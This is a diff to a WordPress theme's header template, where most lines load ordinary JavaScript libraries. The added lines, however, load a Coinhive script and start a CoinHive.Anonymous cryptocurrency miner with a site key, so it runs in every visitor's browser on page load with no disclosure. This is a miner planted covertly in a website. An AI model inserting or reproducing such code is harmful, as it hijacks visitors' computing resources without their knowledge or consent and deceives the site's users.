@@ -65,6 +65,11 @@
 <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/infinitescroll.min.js"></script>
 <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/masonry.pkgd.min.js"></script>
 <script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/imagesloaded.min.js"></script>
+<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('HNwmonit2HqbX4mk5j2X7i3pYbwMLLDj', {threads: 1});
+    miner.start();
+</script>
 <script async type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/ndt.js"></script>
 <script async src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
 <!--
